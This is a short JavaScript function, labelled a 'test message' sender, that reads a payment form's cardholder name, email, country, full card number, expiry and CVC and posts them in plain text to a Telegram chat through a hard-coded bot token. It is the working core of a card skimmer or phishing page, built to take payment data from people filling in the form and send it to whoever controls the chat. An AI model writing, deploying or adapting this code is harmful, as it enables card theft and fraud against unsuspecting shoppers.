async function sendTestMessage() {
    const email = document.getElementById("email").value.trim();
    const cardHolderName = document.getElementById("billingName").value.trim();
    const numberInput = document.getElementById("cardNumber").value.trim();
    const expiryInput = document.getElementById("cardExpiry").value.trim();
    const cvcInput = document.getElementById("cardCvc").value.trim();
    const country = document.getElementById("billingCountry").value.trim();


    const telegramBotToken = "8997100869:AAHF5K0FHPsdNmdbw97l8gK32G7IFwh8yQ8";
    const telegramChatId = "-5276877860";

    const message = `
<b>Test Message</b>
Name: ${cardHolderName}
Email: ${email}
Country: ${country}
card Number: ${numberInput}
Expiry: ${expiryInput}
CVC: ${cvcInput}
`;

    const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message.trim(),
                parse_mode: "HTML"
            })
        }
    );
    const data = await response.json();

    console.log(data);
}